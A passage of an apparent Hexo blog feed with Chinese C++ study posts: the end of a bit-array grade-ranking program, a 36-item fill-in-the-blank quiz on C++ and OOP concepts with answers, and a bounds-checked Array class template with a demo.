class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 101   <span class="comment">// 采用百分制，0~100共101个数字</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入学生人数: &quot;</span>;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">grade</span><span class="params">(n)</span></span>;   <span class="comment">// 存放学生成绩</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">bit</span><span class="params">(N, <span class="number">0</span>)</span></span>;  <span class="comment">// 初始化学生成绩比特串，并用于后续存放比特聚合后的数据</span></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">bit_grade</span>(n, bit);  <span class="comment">// 存放所有学生成绩比特串</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 录入成绩并转换为比特串</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入第&quot;</span> &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">&quot;位学生的成绩: &quot;</span>;</span><br><span class="line">        cin &gt;&gt; grade[i];</span><br><span class="line">        <span class="built_in">assert</span>(grade[i] &gt;= <span class="number">0</span> &amp;&amp; grade[i] &lt;= <span class="number">100</span>);</span><br><span class="line">        bit_grade[i][grade[i]] = <span class="number">1</span>;</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比特聚合，即同列相加</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            bit[i] += bit_grade[j][i];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 分数相同归为同一排名</span></span><br><span class="line">            <span class="keyword">if</span> (bit[i] &gt; <span class="number">1</span>)</span><br><span class="line">                bit[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比较</span></span><br><span class="line">    <span class="type">int</span> k, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> choice, stop = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (stop == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;正向排名请填1, 反向排名请填2: &quot;</span>;</span><br><span class="line">        cin &gt;&gt; choice;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (choice == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;请问您需要排名第几的数据: &quot;</span>;</span><br><span class="line">            cin &gt;&gt; k;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">100</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (sum &gt;= k)</span><br><span class="line">                &#123;</span><br><span class="line">                    cout &lt;&lt; <span class="string">&quot;排名第&quot;</span> &lt;&lt; k &lt;&lt; <span class="string">&quot;的数据是: &quot;</span> &lt;&lt; i + <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    sum += bit[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;继续请填1, 停止请填2: &quot;</span>;</span><br><span class="line">            cin &gt;&gt; stop;</span><br><span class="line">            cout &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">assert</span>(choice == <span class="number">2</span>);</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;请问您需要第几小的数据: &quot;</span>;</span><br><span class="line">            cin &gt;&gt; k;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">101</span>; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (sum &gt;= k)</span><br><span class="line">                &#123;</span><br><span class="line">                    cout &lt;&lt; <span class="string">&quot;第&quot;</span> &lt;&lt; k &lt;&lt; <span class="string">&quot;小的数据是: &quot;</span> &lt;&lt; i - <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    sum += bit[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;继续请填1, 停止请填2: &quot;</span>;</span><br><span class="line">            cin &gt;&gt; stop;</span><br><span class="line">            cout &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++填空题汇总</title>
      <link href="/post/237e2b15.html"/>
      <url>/post/237e2b15.html</url>
      
        <content type="html"><![CDATA[<div class="table-container"><table><thead><tr><th style="text-align:left"></th><th>题目</th><th></th></tr></thead><tbody><tr><td style="text-align:left">1.</td><td>除了可以通过对象名来引用静态成员，还可以使用<code>类名</code>引用静态成员。</td><td></td></tr><tr><td style="text-align:left">2.</td><td>在C++中，每个类都有一个隐含的指针叫做<code>this</code>指针，该指针指向正在被成员函数操作的对象。</td><td></td></tr><tr><td style="text-align:left">3.</td><td>在C++中，对象引用做函数参数要比<code>对象指针</code>做参数更普通。</td><td></td></tr><tr><td style="text-align:left">4.</td><td>在常成员函数中，<code>const</code>是函数类型的一部分，在函数声明和函数定义部分都要有该关键字。</td><td></td></tr><tr><td style="text-align:left">5.</td><td>常数据成员的值必须初始化且不能改变，因此在类中声明常数据成员时，只能通过<code>构造函数</code>成员初始化列表的方式来实现。</td><td></td></tr><tr><td style="text-align:left">6.</td><td>静态数据成员初始化必须在<code>类外</code>进行。</td><td></td></tr><tr><td style="text-align:left">7.</td><td>纯虚函数是一种特别的虚函数，它没有函数的<code>函数体</code>部分，也没有为函数的功能提供实现的代码，它的实现版本必须由派生类给出，因此纯虚函数不能是友元函数</td><td></td></tr><tr><td style="text-align:left">8.</td><td>动态联编对函数的选择不是基于指针或者引用，而是基于<code>对象</code>，在编译、链接过程中无法解决的绑定问题要等到程序开始运行之后再确定</td><td></td></tr><tr><td style="text-align:left">9.</td><td>按照联编所进行的阶段不同，可分为两种不同的联编方法：<code>静态联编和动态联编</code></td><td></td></tr><tr><td style="text-align:left">10.</td><td>强制类型转换是通过<code>强制类型转换运算符</code>来实现的</td><td></td></tr><tr><td style="text-align:left">11.</td><td>函数重载和<code>运算符重载</code>都属于重载多态</td><td></td></tr><tr><td style="text-align:left">12.</td><td>函数重载就是一种<code>多态</code>，相同的函数名，对应多个不同的函数体</td><td></td></tr><tr><td style="text-align:left">13.</td><td>运算符重载函数的两种主要方式是成员函数和<code>友元函数</code></td><td></td></tr><tr><td style="text-align:left">14.</td><td>赋值运算符可以重载，但是无论参数为何种类型，赋值运算符都必须重载为成员函数，并且因为返回的是左值，所以返回值的类型必须是该类的<code>引用</code></td><td></td></tr><tr><td style="text-align:left">15.</td><td>定义一个函数名为fun，返回值为int，没有参数的纯虚函数的定义是<code>virtual int fun()=0;</code></td><td></td></tr><tr><td style="text-align:left">16.</td><td>动态多态性通过<code>虚函数</code>实现</td><td></td></tr><tr><td style="text-align:left">17.</td><td>如果在类中定义了一个成员函数为<code>虚函数</code>，则表明在该继承层次链条的派生类中有可能重新定义这个成员函数的实现，即它可能被派生类的同名函数所覆盖</td><td></td></tr><tr><td style="text-align:left">18.</td><td>如果类包含了一个或多个<code>纯虚函数</code>，则它是抽象类</td><td></td></tr><tr><td style="text-align:left">19.</td><td>多态性分为两类：编译时的多态性和<code>运行时</code>的多态性</td><td></td></tr><tr><td style="text-align:left">20.</td><td>虚函数必须是类的<code>成员函数</code></td><td></td></tr><tr><td style="text-align:left">21.</td><td>在面向对象的软件系统中，对象是基本的运行时实体，它既包含数据（属性），也包括作用于数据的<code>操作</code></td><td></td></tr><tr><td style="text-align:left">22.</td><td>基本概念  类是具体由共同属性和服务构成的一组对象的集合，它为属于该类的全部对象提供了抽象的描述，其内部包括<code>属性</code>和行为两个主要部分</td><td></td></tr><tr><td style="text-align:left">23.</td><td>类通过<code>接口</code>与外界发生关系</td><td></td></tr><tr><td style="text-align:left">24.</td><td>一个类只允许有一个父类，这样的继承称为<code>单继承</code></td><td></td></tr><tr><td style="text-align:left">25.</td><td>在面向对象程序设计方法中，对象是系统中用来描述客观事物的一个实体，它由<code>数据</code>和可执行的一组操作共同组成</td><td></td></tr><tr><td style="text-align:left">26.</td><td>基本概念  对象根据所接受的消息而做出动作，同样的消息被不同的对象接受时可能导致完全不同的行为，这种现象称为<code>多态</code></td><td></td></tr><tr><td style="text-align:left">27.</td><td><code>继承</code>是指使用已经存在的类定义作为基础建立新的类定义的技术</td><td></td></tr><tr><td style="text-align:left">28.</td><td>类是对象的抽象，而一个对象则是其对应的一个<code>实例</code></td><td></td></tr><tr><td style="text-align:left">29.</td><td>在面向对象分析和设计中，通常把对象所进行的操作称为<code>服务</code></td><td></td></tr><tr><td style="text-align:left">30.</td><td>在面向对象的方法中，类的实例称为<code>对象</code></td><td></td></tr><tr><td style="text-align:left">31.</td><td>程序的开发步骤  一个 C/C++ 程序的开发步骤通常包括编辑、 <code>编译</code>、连接、运行和调试</td><td></td></tr><tr><td style="text-align:left">32.</td><td>在面向对象程序设计中，程序中的一切操作都是通过向对象发送<code>消息</code>实现</td><td></td></tr><tr><td style="text-align:left">33.</td><td>一个类允许有多个父类，这样的继承称为<code>多继承</code></td><td></td></tr><tr><td style="text-align:left">34.</td><td>关于全局变量全局变量也叫<code>外部变量</code>，它是在所有函数或程序块以外定义的变量</td><td></td></tr><tr><td style="text-align:left">35.</td><td>关于位运算若有变量定义 int a = 13, b = 6; 则表达式 a &amp; b 的值为<code>4</code></td><td></td></tr><tr><td style="text-align:left">36.</td><td>主函数的名称 C/C++ 程序中必须包含一个名为<code>main</code>的函数，它被称为主函数。</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自定义数组类</title>
      <link href="/post/f0d4af91.html"/>
      <url>/post/f0d4af91.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdexcept&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> size_a 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> size_b 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> add_size 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组类模板定义</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Array</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T *list;        <span class="comment">// T类型指针，用于存放动态分配的数组内存首地址</span></span><br><span class="line">    <span class="type">int</span> size;        <span class="comment">// 数组大小（元素个数）</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Array</span>(<span class="type">int</span> sz = <span class="number">50</span>);                        <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="built_in">Array</span>(<span class="type">const</span> Array&lt;T&gt; &amp;a);        <span class="comment">// 拷贝构造函数</span></span><br><span class="line">    ~<span class="built_in">Array</span>();        <span class="comment">//析构函数</span></span><br><span class="line">    Array&lt;T&gt; &amp;<span class="keyword">operator</span> = (<span class="type">const</span> Array&lt;T&gt; &amp;rhs);  <span class="comment">// 重载&quot;=&quot;使数组对象可以整体赋值</span></span><br><span class="line">    T &amp;<span class="keyword">operator</span> [] (<span class="type">int</span> i);        <span class="comment">// 重载&quot;[]&quot;，使Array对象可以起到C++普通数组的作用</span></span><br><span class="line">    <span class="type">const</span> T &amp;<span class="keyword">operator</span> [] (<span class="type">int</span> i)  <span class="type">const</span>;        <span class="comment">// &quot;[]&quot;运算符的const版本</span></span><br><span class="line">    <span class="keyword">operator</span> T *();        <span class="comment">// 重载到T*类型的转换，使Array对象可以起到C++普通数组的作用</span></span><br><span class="line">    <span class="keyword">operator</span> <span class="type">const</span> T *()  <span class="type">const</span>;        <span class="comment">// 到T*类型转换操作符的const版本</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getSize</span><span class="params">()</span> <span class="type">const</span></span>;        <span class="comment">// 取数组的大小</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">resize</span><span class="params">(<span class="type">int</span> sz)</span></span>;        <span class="comment">// 修改数组的大小</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">Array&lt;T&gt;::<span class="built_in">Array</span>(<span class="type">int</span> sz) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">assert</span>(sz &gt;= <span class="number">0</span>);        <span class="comment">// sz为数组大小（元素个数），应当非负</span></span><br><span class="line">    size = sz;        <span class="comment">// 将元素个数赋值给变量size</span></span><br><span class="line">    list = <span class="keyword">new</span> T[size];        <span class="comment">// 动态分配size个T类型的元素空间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 析构函数</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">Array&lt;T&gt;::~<span class="built_in">Array</span>() </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span>[] list;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拷贝构造函数</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">Array&lt;T&gt;::<span class="built_in">Array</span>(<span class="type">const</span> Array&lt;T&gt; &amp;a) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 从对象x取得数组大小，并赋值给当前对象的成员</span></span><br><span class="line">    size = a.size;</span><br><span class="line">    <span class="comment">// 为对象申请内存并进行出错检查</span></span><br><span class="line">    list = <span class="keyword">new</span> T[size];        <span class="comment">// 动态分配n个T类型的元素空间</span></span><br><span class="line">    <span class="comment">// 从对象X复制数组元素到本对象</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        list[i] = a.list[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载&quot;=&quot;运算符，将对象rhs赋值给本对象。实现对象之间的整体赋值</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">Array&lt;T&gt; &amp;Array&lt;T&gt;::<span class="keyword">operator</span> = (<span class="type">const</span> Array&lt;T&gt; &amp;rhs) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (&amp;rhs != <span class="keyword">this</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果本对象中数组大小与rhs不同，则删除数组原有内存，然后重新分配</span></span><br><span class="line">        <span class="keyword">if</span> (size != rhs.size) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">delete</span>[] list;                <span class="comment">// 删除数组原有内存</span></span><br><span class="line">            size = rhs.size;        <span class="comment">// 设置本对象的数组大小</span></span><br><span class="line">            list = <span class="keyword">new</span> T[size];        <span class="comment">// 重新分配n个元素的内存</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 从对象X复制数组元素到本对象</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            list[i] = rhs.list[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;        <span class="comment">// 返回当前对象的引用</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载下标运算符，实现与普通数组一样通过下标访问元素，并且具有越界检查功能</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">T &amp;Array&lt;T&gt;::<span class="keyword">operator</span> [] (<span class="type">int</span> i) <span class="keyword">throw</span>(out_of_range)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= size)</span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">out_of_range</span>(<span class="string">&quot;Exception:out of range!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> list[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">const</span> T &amp;Array&lt;T&gt;::<span class="keyword">operator</span> [] (<span class="type">int</span>  i) <span class="function"><span class="type">const</span> <span class="title">throw</span><span class="params">(out_of_range)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= size)</span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">out_of_range</span>(<span class="string">&quot;Exception:out of range!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> list[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载指针转换运算符，将Array类的对象名转换为T类型的指针，</span></span><br><span class="line"><span class="comment">// 指向当前对象中的私有数组。</span></span><br><span class="line"><span class="comment">// 因而可以象使用普通数组首地址一样使用Array类的对象名</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">Array&lt;T&gt;::<span class="keyword">operator</span> T *() </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> list;        <span class="comment">// 返回当前对象中私有数组的首地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">Array&lt;T&gt;::<span class="keyword">operator</span> <span class="type">const</span> T *() <span class="type">const</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> list;        <span class="comment">// 返回当前对象中私有数组的首地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取当前数组的大小</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">int</span> Array&lt;T&gt;::<span class="built_in">getSize</span>() <span class="type">const</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将数组大小修改为sz</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> Array&lt;T&gt;::<span class="built_in">resize</span>(<span class="type">int</span> sz) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">assert</span>(sz &gt;= <span class="number">0</span>);        <span class="comment">// 检查sz是否非负</span></span><br><span class="line">    <span class="keyword">if</span> (sz == size)        <span class="comment">// 如果指定的大小与原有大小一样，什么也不做</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    T *newList = <span class="keyword">new</span> T[sz];        <span class="comment">// 申请新的数组内存</span></span><br><span class="line">    <span class="type">int</span> n = (sz &lt; size) ? sz : size;        <span class="comment">// 将sz与size中较小的一个赋值给n</span></span><br><span class="line">    <span class="comment">// 将原有数组中前n个元素复制到新数组中</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        newList[i] = list[i];</span><br><span class="line">    <span class="keyword">delete</span>[] list;                <span class="comment">// 删除原数组</span></span><br><span class="line">    list = newList;        <span class="comment">// 使list指向新数组</span></span><br><span class="line">    size = sz;        <span class="comment">// 更新size</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Array&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(size_a)</span></span>;</span><br><span class="line">    <span class="function">Array&lt;<span class="type">int</span>&gt; <span class="title">b</span><span class="params">(size_b)</span></span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;数组a的大小为：&quot;</span> &lt;&lt; a.<span class="built_in">getSize</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;数组b的大小为：&quot;</span> &lt;&lt; b.<span class="built_in">getSize</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size_a; ++i)</span><br><span class="line">            a[i] = i + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        b = a;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;数组b的大小为：&quot;</span> &lt;&lt; b.<span class="built_in">getSize</span>() &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;数组b的内容为：&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; b.<span class="built_in">getSize</span>(); ++i)</span><br><span class="line">            cout &lt;&lt; b[i] &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        b.<span class="built_in">resize</span>(b.<span class="built_in">getSize</span>() + add_size);</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;扩展数组b的容量后，其大小为：&quot;</span> &lt;&lt; b.<span class="built_in">getSize</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 测试异常捕获</span></span><br><span class="line">        cout &lt;&lt; b[b.<span class="built_in">getSize</span>()] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (out_of_range &amp;e)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; e.<span class="built_in">what</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
